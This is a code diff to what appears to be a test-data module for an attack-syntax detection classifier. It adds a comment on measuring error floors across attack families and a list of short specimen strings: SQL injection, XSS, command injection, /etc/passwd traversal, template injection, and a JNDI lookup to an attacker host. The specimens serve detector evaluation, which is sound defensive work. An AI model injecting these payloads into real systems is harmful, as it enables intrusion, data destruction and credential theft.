@@ -775,6 +775,15 @@ _N_DISCUSSION = len(AMBIGUOUS_FRAMES_DISCUSSION)
 # Short, recognisable attack-syntax specimens quoted inside the frames above.
 # Covers all fourteen families, so the error floor is measured across the whole
 # taxonomy rather than only the families that existed in v2.1.
+#
+# The floor must not rest on any *one* specimen: v4.3.0's verbatim floor was
+# carried almost entirely by the single ssrf metadata URL, because that string
+# was over-represented in ssrf training. When v4.4.0 diversified the thin
+# families (ssrf/crlf/jndi/nosqli) their exact strings stopped dominating
+# training and the floor collapsed. The list below is deliberately broad across
+# the high-volume families (sqli/xss/cmdi/traversal/ssti), each of which has
+# thousands of training rows, so a strong char n-gram fires on many of these
+# verbatim cores and the floor is measured across the taxonomy, not one URL.
 AMBIGUOUS_SPECIMENS = [
     "' OR 1=1--", "admin'--", "' UNION ALL SELECT password FROM users--",
     "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
@@ -786,6 +795,13 @@ AMBIGUOUS_SPECIMENS = [
     "${jndi:ldap://attacker/a}", "__proto__[isAdmin]=true",
     "{\"__proto__\":{\"role\":\"admin\"}}", "O:8:\"stdClass\":1:{s:4:\"user\";}",
     "!!python/object/apply:os.system", "Transfer-Encoding: chunked",
+    # High-volume-family specimens, added in v4.4.0 so the verbatim floor is
+    # carried across families rather than by a single over-represented string.
+    "' OR '1'='1", "1' ORDER BY 3--", "'; DROP TABLE users;--",
+    "<svg/onload=alert(1)>", "\"><script>alert(1)</script>",
+    "<body onload=alert(1)>", "&& id", "`id`", "; ping -c 4 127.0.0.1",
+    "../../../../etc/passwd", "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "{{config.items()}}", "${{7*7}}",
 ]
 
 # Enumerated (frame, specimen) cores, in fixed order.
